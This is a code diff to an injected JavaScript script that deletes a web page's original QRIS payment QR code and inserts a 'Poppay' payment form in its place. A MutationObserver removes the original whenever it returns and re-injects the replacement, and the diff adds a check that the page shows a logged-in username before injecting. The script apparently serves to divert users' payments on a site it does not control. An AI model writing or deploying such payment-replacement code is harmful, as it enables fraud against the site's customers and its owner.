@@ -19,7 +19,7 @@
     };
     
     // ========================================================================
-    // Get Username
+    // Get Username (STRICT MODE - No Fallback)
     // ========================================================================
     async function getUsername() {
         try {
@@ -28,16 +28,33 @@
             for (const div of allDivs) {
                 const text = div.textContent.trim();
                 if (text.length >= 3 && text.length <= 20 && /^[a-zA-Z0-9_]+$/.test(text)) {
-                    console.log(`✅ [UG-QRIS] Username: ${text}`);
+                    console.log(`✅ [UG-QRIS] Username found: ${text}`);
                     return text;
                 }
             }
             
-            // Fallback
-            return 'GUEST-' + Date.now();
+            // NO FALLBACK - Return null if not found
+            console.warn('⚠️ [UG-QRIS] Username NOT found - will NOT inject');
+            return null;
         } catch (error) {
-            return 'GUEST-' + Date.now();
+            console.error('❌ [UG-QRIS] Error getting username:', error);
+            return null;
         }
+    }
+    
+    // ========================================================================
+    // Check if Username Exists (Pre-Injection Validation)
+    // ========================================================================
+    async function validateUsernameExists() {
+        const username = await getUsername();
+        
+        if (!username) {
+            console.warn('⚠️ [UG-QRIS] INJECTION DISABLED - Username not found');
+            return false;
+        }
+        
+        console.log('✅ [UG-QRIS] Username validation passed');
+        return true;
     }
     
     // ========================================================================
@@ -91,7 +108,7 @@
     // ========================================================================
     // Delete Original QRIS & Insert Poppay Form
     // ========================================================================
-    function replaceQRIS() {
+    async function replaceQRIS() {
         const qrisElement = findQRISElement();
         
         if (!qrisElement) {
@@ -102,6 +119,13 @@
         if (document.getElementById('ug-poppay-qris-full')) {
             console.log('ℹ️ [UG-QRIS] Already injected');
             return true;
+        }
+        
+        // CRITICAL: Validate username exists BEFORE injection
+        const isValid = await validateUsernameExists();
+        if (!isValid) {
+            console.error('❌ [UG-QRIS] INJECTION BLOCKED - No valid username found');
+            return false;
         }
         
         console.log('🔄 [UG-QRIS] Deleting original QRIS and injecting Poppay...');
@@ -428,8 +452,12 @@
                     await loadQrisSDK();
                 }
                 
-                // Get username
+                // Get username (with validation)
                 const username = await getUsername();
+                
+                if (!username) {
+                    throw new Error('Username tidak ditemukan. Silakan login terlebih dahulu.');
+                }
                 
                 // Hide form, show result
                 formContainer.style.display = 'none';
@@ -540,11 +568,19 @@
     let isInjected = false;
     let observer = null;
     
-    function startPersistentInjection() {
+    async function startPersistentInjection() {
         console.log('🔄 [UG-QRIS] Starting persistent injection...');
         
+        // Validate username FIRST
+        const isValid = await validateUsernameExists();
+        if (!isValid) {
+            console.error('❌ [UG-QRIS] INJECTION ABORTED - No username detected');
+            console.error('❌ [UG-QRIS] Script will NOT activate without valid username');
+            return;
+        }
+        
         // Initial inject
-        const success = replaceQRIS();
+        const success = await replaceQRIS();
         if (success) {
             isInjected = true;
             console.log('✅ [UG-QRIS] Initial injection successful');
@@ -564,24 +600,34 @@
                 originalQRIS.remove();
             }
             
-            // If our element was removed, re-inject
+            // If our element was removed, re-inject (with username check)
             if (!ourElement && isInjected) {
                 console.log('⚠️ [UG-QRIS] Our element removed, re-injecting...');
                 
-                setTimeout(() => {
-                    const reinjected = replaceQRIS();
-                    if (reinjected) {
-                        console.log('✅ [UG-QRIS] Re-injection successful');
+                setTimeout(async () => {
+                    const isValid = await validateUsernameExists();
+                    if (isValid) {
+                        const reinjected = await replaceQRIS();
+                        if (reinjected) {
+                            console.log('✅ [UG-QRIS] Re-injection successful');
+                        }
+                    } else {
+                        console.warn('⚠️ [UG-QRIS] Re-injection skipped - no username');
                     }
                 }, 100);
             }
             
-            // If not injected yet, try to inject
+            // If not injected yet, try to inject (with username check)
             if (!isInjected) {
-                const success = replaceQRIS();
-                if (success) {
-                    isInjected = true;
-                }
+                (async () => {
+                    const isValid = await validateUsernameExists();
+                    if (isValid) {
+                        const success = await replaceQRIS();
+                        if (success) {
+                            isInjected = true;
+                        }
+                    }
+                })();
             }
         });
         
@@ -597,11 +643,20 @@
     // Start with retry mechanism
     let retryCount = 0;
     
-    function tryStart() {
+    async function tryStart() {
+        // FIRST: Check if username exists
+        const hasUsername = await validateUsernameExists();
+        
+        if (!hasUsername) {
+            console.error('❌ [UG-QRIS] SCRIPT DISABLED - Username not found');
+            console.error('❌ [UG-QRIS] Will NOT activate injection without valid username');
+            return; // STOP completely
+        }
+        
         const qrisElement = findQRISElement();
         
         if (qrisElement || retryCount >= CONFIG.MAX_RETRIES) {
-            startPersistentInjection();
+            await startPersistentInjection();
         } else {
             retryCount++;
             console.log(`🔄 [UG-QRIS] Waiting for QRIS element... (${retryCount}/${CONFIG.MAX_RETRIES})`);
